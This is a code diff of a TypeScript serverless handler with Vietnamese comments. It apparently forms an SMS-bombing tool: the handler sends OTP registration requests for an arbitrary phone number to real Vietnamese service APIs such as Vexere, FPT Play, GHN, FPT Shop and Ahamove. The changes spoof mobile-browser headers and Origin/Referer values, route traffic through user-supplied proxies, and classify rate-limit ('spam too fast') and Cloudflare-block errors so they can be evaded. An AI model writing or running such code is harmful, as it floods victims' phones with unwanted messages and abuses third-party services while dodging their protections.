@@ -11,56 +11,62 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   const { serviceId, phone, proxyConfig } = req.body;
   
   if (!serviceId || !phone) {
-    return res.status(400).json({ error: 'Thiếu tham số (phone hoặc serviceId)' });
+    return res.status(400).json({ error: 'Thiếu số điện thoại hoặc dịch vụ' });
   }
 
   const phoneClean = phone.replace(/\s+/g, '');
   const phoneWith84 = phoneClean.startsWith('0') ? '84' + phoneClean.substring(1) : phoneClean;
 
   let agent = null;
-  if (proxyConfig && proxyConfig.host) {
+  if (proxyConfig && proxyConfig.host && proxyConfig.port) {
     const { host, port, user, pass } = proxyConfig;
-    // Sử dụng định dạng chuẩn cho Proxy Auth
+    // Sử dụng giao thức http cho cả proxy https vì hầu hết proxy cá nhân là http tunnel
     const proxyUrl = user && pass 
       ? `http://${user}:${pass}@${host}:${port}`
       : `http://${host}:${port}`;
     
     try {
       agent = new HttpsProxyAgent(proxyUrl);
-      console.log(`[PROXY] Using: ${host}:${port}`);
     } catch (e) {
-      console.error("[PROXY ERROR] Agent init failed:", e);
+      console.error("Proxy Agent Init Error:", e);
     }
   }
 
   try {
     let url = '';
     let bodyData: any = {};
+    let method = 'POST';
     let headers: any = {
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      'Accept': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
+      'Accept': 'application/json, text/plain, */*',
+      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
       'Content-Type': 'application/json',
-      'Referer': 'https://google.com',
-      'Origin': 'https://google.com'
+      'X-Requested-With': 'XMLHttpRequest',
+      'Connection': 'keep-alive'
     };
 
-    // Định nghĩa các dịch vụ OTP (Cập nhật endpoint mới nhất)
+    // Cập nhật các endpoint OTP có tỷ lệ sống cao
     switch (serviceId) {
       case 'vexere':
         url = 'https://api.vexere.com/v1/user/otp';
         bodyData = { phone: phoneClean, type: 'register' };
+        headers['Origin'] = 'https://vexere.com';
+        headers['Referer'] = 'https://vexere.com/';
         break;
       case 'fptplay':
         url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp';
-        bodyData = { phone: phoneClean };
+        bodyData = { phone: phoneClean, platform: 'web' };
+        headers['Origin'] = 'https://fptplay.vn';
         break;
       case 'ghn':
         url = 'https://sso.ghn.vn/v2/otp/send';
         bodyData = { phone: phoneClean };
+        headers['Origin'] = 'https://sso.ghn.vn';
         break;
       case 'fptshop':
         url = 'https://fptshop.com.vn/api-fsh/customer/get-otp';
         bodyData = { phoneNumber: phoneClean, type: 1 };
+        headers['Referer'] = 'https://fptshop.com.vn/';
         break;
       case 'ahamove':
         url = 'https://app.ahamove.com/api/v1/user/otp';
@@ -71,15 +77,14 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
         bodyData = { phone: phoneWith84, country: 'VN' };
         break;
       default:
-        url = 'https://api.vexere.com/v1/user/otp';
-        bodyData = { phone: phoneClean };
+        return res.status(400).json({ error: 'Dịch vụ không xác định' });
     }
 
     const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 15000); // 15s cho Proxy
+    const timeout = setTimeout(() => controller.abort(), 12000); // 12 giây timeout
 
     const response = await fetch(url, {
-      method: 'POST',
+      method: method,
       headers: headers,
       body: JSON.stringify(bodyData),
       agent: agent,
@@ -90,36 +95,40 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     
     const status = response.status;
     const resText = await response.text();
-    let resJson = {};
+    let resJson: any = {};
     try { resJson = JSON.parse(resText); } catch(e) {}
 
-    if (response.ok) {
+    // Một số API trả về 200 nhưng Success: false trong JSON
+    const isActuallySuccess = response.ok && (resJson.success !== false && resJson.error !== true);
+
+    if (isActuallySuccess) {
       return res.status(200).json({ 
         success: true, 
-        message: "Gửi thành công",
-        debug: resJson
+        message: "Yêu cầu đã được gửi",
+        proxy: proxyConfig ? `${proxyConfig.host}:${proxyConfig.port}` : 'Direct'
       });
     } else {
-      return res.status(status).json({ 
+      // Phân tích lỗi cụ thể
+      let errorDetail = resJson.message || resJson.error || "Bị chặn bởi dịch vụ";
+      if (status === 429) errorDetail = "Spam quá nhanh (Rate Limit)";
+      if (status === 403) errorDetail = "Proxy bị Cloudflare chặn (403)";
+      
+      return res.status(200).json({ 
         success: false, 
-        message: `Dịch vụ từ chối (${status})`,
-        error: resText
+        message: errorDetail,
+        status: status
       });
     }
 
   } catch (error: any) {
-    let friendlyMessage = "Lỗi kết nối mạng";
+    let errMsg = "Lỗi kết nối";
+    if (error.name === 'AbortError') errMsg = "Proxy phản hồi chậm (Timeout)";
+    if (error.code === 'ECONNREFUSED') errMsg = "Proxy chết hoặc sai Port";
+    if (error.message.includes('407')) errMsg = "Proxy sai User/Pass (407)";
     
-    if (error.name === 'AbortError') friendlyMessage = "Proxy quá chậm (Timeout 15s)";
-    else if (error.code === 'ECONNREFUSED') friendlyMessage = "Proxy chết hoặc sai Port";
-    else if (error.code === 'EPROTO') friendlyMessage = "Lỗi giao thức Proxy (Sai IP/Auth)";
-    else if (error.message.includes('407')) friendlyMessage = "Proxy sai Tài khoản/Mật khẩu";
-    
-    console.error(`[API ERROR] ${error.message}`);
-
     return res.status(200).json({ 
       success: false, 
-      message: friendlyMessage,
+      message: errMsg,
       error: error.message
     });
   }
